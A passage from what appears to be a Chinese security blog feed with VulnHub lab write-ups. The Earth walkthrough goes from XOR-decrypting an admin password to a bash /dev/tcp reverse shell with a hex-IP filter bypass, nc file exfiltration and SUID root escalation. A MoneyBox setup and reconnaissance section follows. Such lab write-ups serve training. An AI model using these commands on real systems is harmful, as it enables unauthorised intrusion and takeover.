class="hljs-number">1</span>b<span class="hljs-number">410</span>f<span class="hljs-number">090142030153091</span>b<span class="hljs-number">4</span>d<span class="hljs-number">150153040714110</span>b<span class="hljs-number">174</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">13000</span>d<span class="hljs-number">441</span>b<span class="hljs-number">410</span>f<span class="hljs-number">13080</span>d<span class="hljs-number">12145</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>d<span class="hljs-number">0708410</span>f<span class="hljs-number">1</span>d<span class="hljs-number">014101011</span>a<span class="hljs-number">050</span>d<span class="hljs-number">0</span>a<span class="hljs-number">084</span>d<span class="hljs-number">540906090507090242150</span>b<span class="hljs-number">141</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">08411e010</span>a<span class="hljs-number">0</span>d<span class="hljs-number">1</span>b<span class="hljs-number">120</span>d<span class="hljs-number">110</span>d<span class="hljs-number">1</span>d<span class="hljs-number">040e1</span>a<span class="hljs-number">450</span><span class="hljs-keyword">c</span><span class="hljs-number">0e410</span>f<span class="hljs-number">090407130</span>b<span class="hljs-number">5601164</span>d<span class="hljs-number">00001749411e151</span><span class="hljs-keyword">c</span><span class="hljs-number">061e454</span>d<span class="hljs-number">0011170</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>a<span class="hljs-number">080</span>d<span class="hljs-number">470</span>a<span class="hljs-number">1006055</span>a<span class="hljs-number">010600124053360e1</span>f<span class="hljs-number">1148040906010e130</span><span class="hljs-keyword">c</span><span class="hljs-number">00090</span>d<span class="hljs-number">4e02130</span>b<span class="hljs-number">05015</span>a<span class="hljs-number">0</span>b<span class="hljs-number">104</span>d<span class="hljs-number">0800170</span><span class="hljs-keyword">c</span><span class="hljs-number">0213000</span>d<span class="hljs-number">104</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">050000450</span>f<span class="hljs-number">01070</span>b<span class="hljs-number">47080318445</span><span class="hljs-keyword">c</span><span class="hljs-number">090308410</span>f<span class="hljs-number">010</span><span class="hljs-keyword">c</span><span class="hljs-number">12171</span>a<span class="hljs-number">48021</span>f<span class="hljs-number">49080006091</span>a<span class="hljs-number">48001</span>d<span class="hljs-number">47514</span><span class="hljs-keyword">c</span><span class="hljs-number">50445601190108011</span>d<span class="hljs-number">451817151</span>a<span class="hljs-number">104</span><span class="hljs-keyword">c</span><span class="hljs-number">080</span>a<span class="hljs-number">0e5</span>a<br></code></pre></td></tr></table></figure><p>第二个网站</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//terratest.earth.local/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125647730.png" alt="image-20250426125647730"></p><h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u https://earth.local/ -e *<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125758144.png" alt="image-20250426125758144"></p><p>扫出了<code>/admin</code>目录，再扫一下另一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u https://terratest.earth.local/ -e *<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125532468.png" alt="image-20250426125532468"></p><p>扫出<code>robots.txt</code></p><p>挨个访问看看</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//earth.local/admin</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125937051.png" alt="image-20250426125937051"></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426125946263.png" alt="image-20250426125946263"></p><p>需要用户名和密码登录，再看看另一个网站</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//terratest.earth.local/robots.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426130127054.png" alt="image-20250426130127054"></p><p>发现一个<code>testingnotes</code>文件，但不确定格式，可以尝试出是<code>.txt</code>文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//terratest.earth.local/testingnotes.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426130235265.png" alt="image-20250426130235265"></p><p>用AI翻译过来是</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">安全消息系统测试笔记：<br>使用异或加密算法，鉴于其在 RSA 中的应用，该算法应是安全的。<br>地球方面已确认收到我们发送的消息。<br>使用 testdata<span class="hljs-selector-class">.txt</span> 对加密功能进行了测试。<br>“terra” 被用作管理门户的用户名。<br>待办事项：<br>我们该如何安全地向地球发送每月密钥？还是说我们应该每周更换密钥？<br>需要测试不同的密钥长度以抵御暴力破解。密钥多长合适呢？<br>需要改进消息传递界面和管理面板的界面，目前它们过于简陋。<br></code></pre></td></tr></table></figure><p>可知使用的是异或加密算法，并且对<code>testdata.txt</code>对进行了加密测试，用户名是<code>terra</code>，访问<code>testdata.txt</code>看看</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//terratest.earth.local/testdata.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426130615160.png" alt="image-20250426130615160"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">According <span class="hljs-keyword">to</span> radiometric dating estimation <span class="hljs-keyword">and</span> other evidence, Earth formed <span class="hljs-keyword">over</span> <span class="hljs-number">4.5</span> billion years ago. <span class="hljs-keyword">Within</span> the first billion years <span class="hljs-keyword">of</span> Earth<span class="hljs-string">&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;</span>s atmosphere <span class="hljs-keyword">and</span> surface, <span class="hljs-keyword">leading</span> <span class="hljs-keyword">to</span> the proliferation <span class="hljs-keyword">of</span> anaerobic <span class="hljs-keyword">and</span>, later, aerobic organisms. <span class="hljs-keyword">Some</span> geological evidence indicates that life may have arisen <span class="hljs-keyword">as</span> early <span class="hljs-keyword">as</span> <span class="hljs-number">4.1</span> billion years ago.<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">根据放射性测年估算及其他证据，地球形成于<span class="hljs-number"> 45 </span>亿多年前。在地球历史的最初<span class="hljs-number"> 10 </span>亿年里，生命在海洋中出现，并开始影响地球的大气和地表，导致厌氧生物繁衍，随后好氧生物也开始出现。一些地质证据表明，生命最早可能在<span class="hljs-number"> 41 </span>亿年前就已出现。<br></code></pre></td></tr></table></figure><h3 id="解密密码"><a href="#解密密码" class="headerlink" title="解密密码"></a>解密密码</h3><p>根据之前第一个网站得到信息进行XOR解密，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-comment"># 给定的十六进制字符串</span><br>c = <span class="hljs-string">&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span><br><br><span class="hljs-comment"># 给定的明文字符串</span><br>m = <span class="hljs-string">&quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span><br><br><span class="hljs-comment"># 将明文字符串转换为十六进制表示</span><br>m_hex = binascii.hexlify(m.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-comment"># 确保两个十六进制字符串长度一致</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(c) != <span class="hljs-built_in">len</span>(m_hex):<br>    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;The length of c and m_hex must be the same.&quot;</span>)<br><br><span class="hljs-comment"># 将十六进制字符串转换为整数，进行异或操作</span><br>result_hex = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(c, <span class="hljs-number">16</span>) ^ <span class="hljs-built_in">int</span>(m_hex, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]  <span class="hljs-comment"># 去掉前缀 &quot;0x&quot;</span><br><br><span class="hljs-comment"># 确保结果的长度与原始字符串一致</span><br>result_hex = result_hex.zfill(<span class="hljs-built_in">len</span>(c))<br><br><span class="hljs-comment"># 将异或后的十六进制字符串转换回字节</span><br>result_bytes = binascii.unhexlify(result_hex)<br><br><span class="hljs-comment"># 将字节解码为字符串</span><br>result_str = result_bytes.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-built_in">print</span>(result_str)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 结果</span><br>earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat<br></code></pre></td></tr></table></figure><p>发现是重复的<code>earthclimatechangebad4humans</code>，这就是密码，去登录</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">用户名：terra<br>密码：earthclimatechangebad4humans<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426131843279.png" alt="image-20250426131843279"></p><p>成功登录，来到一个命令执行页面</p><h3 id="查找flag"><a href="#查找flag" class="headerlink" title="查找flag"></a>查找flag</h3><h4 id="user-flag"><a href="#user-flag" class="headerlink" title="user_flag"></a><code>user_flag</code></h4><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426132012976.png" alt="image-20250426132012976"></p><p>可以执行命令，查看当前用户是<code>apache</code></p><p>使用<code>find</code>命令查找flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*flag*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426132554676.png" alt="image-20250426132554676"></p><p>在<code>/var/earth_web/user_flag.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/earth_web/user_flag.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426132650736.png" alt="image-20250426132650736"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">user_flag_3353b67d6437f07ba7d34afd7d2fc27d<br></code></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>尝试反弹<code>shell</code>到kali上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426133421555.png" alt="image-20250426133421555"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.1.103/2333 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426132915400.png" alt="image-20250426132915400"></p><p>但是发现进制远程连接，看大佬文章是要对IP进行十六进制转换</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">0</span>xc0.<span class="hljs-number">0</span>xa8.<span class="hljs-number">0</span>x01.<span class="hljs-number">0</span>x67/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426133456856.png" alt="image-20250426133456856"></p><p>成功连上了</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p>看看能不能<code>SUID</code>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426133750901.png" alt="image-20250426133750901"></p><p>尝试用<code>/usr/bin/reset_root</code>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426133956288.png" alt="image-20250426133956288"></p><p>看不懂问AI</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426134150989.png" alt="image-20250426134150989"></p><h4 id="把命令下载到kali调试"><a href="#把命令下载到kali调试" class="headerlink" title="把命令下载到kali调试"></a>把命令下载到kali调试</h4><p>在靶机上不能调试，利用<code>nc</code>将这个命令下载到kali进行调试</p><p>在kali输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nlvp 5555 &gt;reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426134946044.png" alt="image-20250426134946044"></p><p>在靶机上输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 192.168.1.103 5555 &lt; /usr/bin/reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135001530.png" alt="image-20250426135001530"></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135007473.png" alt="image-20250426135007473"></p><p>先对<code>root_reset</code>赋予权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135155202.png" alt="image-20250426135155202"></p><h4 id="使用strace进行调试"><a href="#使用strace进行调试" class="headerlink" title="使用strace进行调试"></a>使用<code>strace</code>进行调试</h4><p>先安装这个命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install strace<br></code></pre></td></tr></table></figure><p>然后开始调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace ./reset_root<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135553990.png" alt="image-20250426135553990"></p><p>发现因为缺少上面的三个文件而调试失败，去靶机上找这三个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /dev/shm/kHgTFI5G<br><span class="hljs-built_in">cat</span> /dev/shm/Zw7bV9U5<br><span class="hljs-built_in">cat</span> /tmp/kcM0Wewe<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135735241.png" alt="image-20250426135735241"></p><p>靶机上果然缺少这三个文件，没有文件那就创建文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> /dev/shm/kHgTFI5G<br><span class="hljs-built_in">touch</span> /dev/shm/Zw7bV9U5<br><span class="hljs-built_in">touch</span> /tmp/kcM0Wewe<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426135945884.png" alt="image-20250426135945884"></p><p>再次尝试运行<code>reset_root</code></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426140126543.png" alt="image-20250426140126543"></p><p>重置<code>root</code>密码为<code>Earth</code>，切换为<code>root</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426140242103.png" alt="image-20250426140242103"></p><h4 id="root-flag"><a href="#root-flag" class="headerlink" title="root_flag"></a><code>root_flag</code></h4><p>成功提权，找flag</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426140324143.png" alt="image-20250426140324143"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[root_flag_b0da9554d29db2117b02aa8b66ec492e]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透 打靶 复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VulnHub靶机MoneyBox复现</title>
    <link href="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>借鉴文章：</p><p><a href="https://blog.csdn.net/YueXuan_521/article/details/135324089">https://blog.csdn.net/YueXuan_521/article/details/135324089</a></p><p><a href="https://blog.csdn.net/Aluxian_/article/details/128672602">https://blog.csdn.net/Aluxian_/article/details/128672602</a></p></blockquote><h1 id="安装靶机"><a href="#安装靶机" class="headerlink" title="安装靶机"></a>安装靶机</h1><p>靶机网址：<a href="https://www.vulnhub.com/entry/moneybox-1,653/">https://www.vulnhub.com/entry/moneybox-1,653/</a></p><p>VirtualBox网址：<a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p><p>如果出现以下报错</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425212824436.png" alt="image-20250425212824436"></p><p>就需要对安装目录给予权限，我的安装目录是 <code>E:\VirtualBox</code> ，就以管理员身份打开命令提示符，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls E:\VirtualBox /reset /t /c<br>icacls E:\VirtualBox /inheritance:d /t /c<br>icacls E:\VirtualBox /grant *S-1-5-32-545:(OI)(CI)(RX) /t /c<br>icacls E:\VirtualBox /deny *S-1-5-32-545:(DE,WD,AD,WEA,WA) /t /c<br>icacls E:\VirtualBox /grant *S-1-5-11:(OI)(CI)(RX) /t /c<br>icacls E:\VirtualBox /deny *S-1-5-11:(DE,WD,AD,WEA,WA) /t /c<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425213050136.png" alt="image-20250425213050136"></p><p>直接选择是，后面的默认选择即可</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425213231938.png" alt="image-20250425213231938"></p><p>安装好后以管理员身份打开，导入下载好的<code>MONEYBOX.ova</code></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425213349283.png" alt="image-20250425213349283"></p><p>然后选择好安装目录，等着导入好就行</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425213553737.png" alt="image-20250425213553737"></p><p>选择启动，可能出现以下报错</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425215240799.png" alt="image-20250425215240799"></p><p>更改网络设置，使用桥连网卡即可</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425215312978.png" alt="image-20250425215312978"></p><h1 id="IP探测"><a href="#IP探测" class="headerlink" title="IP探测"></a>IP探测</h1><h3 id="寻找靶机"><a href="#寻找靶机" class="headerlink" title="寻找靶机"></a>寻找靶机</h3><p>需要准备一台kali，要和靶机处于同一个网段（可以都用桥接模式）</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425215622260.png" alt="image-20250425215622260"></p><p>首先获取kali的网卡信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425225742643.png" alt="image-20250425225742643"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali的IP：192.168.1.103<br></code></pre></td></tr></table></figure><h4 id="使用nmap工具扫描"><a href="#使用nmap工具扫描" class="headerlink" title="使用nmap工具扫描"></a>使用<code>nmap</code>工具扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap 192.168.1.0/24<br></code></pre></td></tr></table></figure><ul><li>**<code>nmap</code>：**网络探索和安全扫描工具</li><li>**<code>192.168.1.0/24：</code> **目标 IP 地址范围。这里的<code>/24</code>表示子网掩码为 <code>255.255.255.0</code>，这意味着 Nmap 将扫描从<code>192.168.1.1</code>到<code>192.168.1.254</code>的所有 IP 地址</li></ul><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425225704959.png" alt="image-20250425225704959"></p><p>看到这个机器开了<code>ftp</code>和<code>ssh</code>，就可以知道是靶机</p><h4 id="使用arp扫描"><a href="#使用arp扫描" class="headerlink" title="使用arp扫描"></a>使用<code>arp</code>扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">arp-scan -I eth0 -l<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425230118925.png" alt="image-20250425230118925"></p><h4 id="使用netdiscover"><a href="#使用netdiscover" class="headerlink" title="使用netdiscover"></a>使用<code>netdiscover</code></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netdiscover -r 192.168.1.0/24<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425230430356.png" alt="image-20250425230430356"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">靶机的IP：192.168.1.102<br></code></pre></td></tr></table></figure><p>得到靶机和<code>kali</code>的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali的IP：192.168.1.103<br>靶机的IP：192.168.1.102<br></code></pre></td></tr></table></figure><h3 id="深入探测"><a href="#深入探测" class="headerlink" title="深入探测"></a>深入探测</h3><p>使用<code>nmap</code>进行深入探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br><br><span class="hljs-comment"># 参数含义：</span><br>-A：Aggressive（激进）扫描模式。这是一个组合选项，包含了以下功能：<br>-sS（TCP SYN 扫描）<br>-sU（UDP 扫描）<br>-sT（TCP connect() 扫描）<br>-sV（服务版本探测）<br>-sC（默认脚本扫描）<br>OS detection（操作系统检测）<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br></code></pre></td></tr></table></figure><p><img 